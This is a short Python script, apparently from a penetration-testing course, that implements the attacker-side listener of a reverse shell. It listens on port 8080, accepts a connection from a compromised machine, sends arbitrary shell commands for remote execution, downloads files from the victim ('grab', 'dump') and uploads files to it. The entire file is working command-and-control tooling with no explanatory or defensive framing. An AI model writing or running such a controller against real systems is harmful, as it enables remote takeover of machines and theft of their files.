#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import socket

PATHS = {
	'download':'/home/sorcererbr/cursos/python_pentest/myscripts/downloads',
	'upload':'/home/sorcererbr/cursos/python_pentest/myscripts/uploads'
}

def upload(s, cmd):
	s.send(cmd.encode())
	up, path = cmd.split('*')
	if os.path.exists(path):
		f = open(path, 'rb')
		packet = f.read(1024)
		while len(packet) > 0:
			s.send(packet)
			packet = f.read(1024)
		s.send('DONE'.encode())
		print('[+] File {0} was uploaded sucessful'.format(path))
	else:
		print('[-] File not found')

def transfer(conn, command):
	grab, path = command.split("*")
	conn.send(command.encode())
	f = open(os.path.join(PATHS['download'], path), 'wb')
	while True:
		bits = conn.recv(1024)
		if bits.endswith('DONE'.encode()):
			f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
			f.close()
			print ('[+] Transfer completed ')
			break
		if 'File not found'.encode() in bits:
			print ('[-] Unable to find out the file')
			break
		f.write(bits)

def connecting():
	s = socket.socket()
	s.bind(("0.0.0.0", 8080))
	s.listen(1)
	print('[+] Listening for income TCP connection on port 8080')
	conn, addr = s.accept()
	print('[+] We got a connection from', addr)

	while True:
		command = input("Shell> ")
		if 'terminate' in command:
			conn.send('terminate'.encode())
			break
		elif 'grab' in command or 'print' in command or 'dump' in command:
			transfer(conn, command)
		elif 'upload' in command:
			upload(conn, command)
		else:
			conn.send(command.encode())
			try:
				print(conn.recv(1024).decode('utf-8','ignore'))
			except Exception as e:
				print('[-] Erro ao executar o comando: {0}'.format(e))

def main():
	connecting()

main()

